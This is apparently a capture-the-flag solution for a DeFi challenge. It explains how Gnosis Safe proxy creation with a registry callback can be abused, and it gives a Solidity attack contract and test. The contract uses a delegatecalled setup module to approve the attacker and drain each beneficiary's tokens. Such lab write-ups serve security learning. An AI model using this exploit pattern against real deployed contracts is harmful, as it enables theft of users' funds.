## GOAL
Your goal is to take all funds from the registry. In a single transaction.

## Expalantion 
This is really a difficult one so let us break it.
1. Firt what is GnosisSafe wallet? The best way is to check it yourself, however my understanding is that it is a multi-sig wallet, that allow many users to be owners, you can setup modules in it if more than half of the owners agreed.
2. Second what is a proxy contract? So imagine you have a contract and you want to upgrade it to another contract what should you do? Here proxies come to place, you can create a proxy contract add all data in it and then you add function to delegate calls to any contract you want by specifying the address. 
3. Now in the GnosisSafe.sol you have a setup function that allow you to setup your proxy.
4. Now if you see in the walletRegistery contract they told us that the proxy is called by 
    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
5. So let us check the createProxyWithCallback in GnosisSafeProxyFactory. As you can see we can set intializer in createProxyWithCallback function so what we will add ;) ?
6. So now how we will break this contract?
   We need to create a wallet for every user and set them as owner, then using the modules since it delegate a call, we can use it to approve our tokens, so by that we    can easily use transferFrom to our address. 

## Solution
```solidity
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol"; 
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract BackdoorAttaker{
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;
    address public immutable walletRegistery;
    uint public constant amount = 10*10**18; // every user has 10 token

    constructor(address _mastercopy,address _walletFactory,address _token,address _walletRegistery) 
    {
        masterCopy = _mastercopy;
        walletFactory = _walletFactory;
        token =IERC20(_token);
        walletRegistery = _walletRegistery;
    }
    function approveDelegateCall(address _spender,address _token) external {
        IERC20(_token).approve(_spender,amount);
    }

    function attack(address[] memory beneficiaries) public 
    {
        for(uint i =0;i<beneficiaries.length;i++)
        {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];

            string memory signature = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory init = abi.encodeWithSignature(signature, 
                beneficiary,
                1,
                address(this),//msg.sender will be the proxy contract
                abi.encodeWithSelector(BackdoorAttaker.approveDelegateCall.selector,address(this),address(token)),
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy,init,123,IProxyCreationCallback(walletRegistery));
            token.transferFrom(
                address(newProxy),
                msg.sender,
                10 ether
            );
        }
    }

    


}

```
```javascript
it('Exploit', async function () {
        this.backdoorAttack = await (await ethers.getContractFactory('BackdoorAttaker', attacker)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            this.walletRegistry.address
        );
        this.backdoorAttack.attack(users);
    });
```
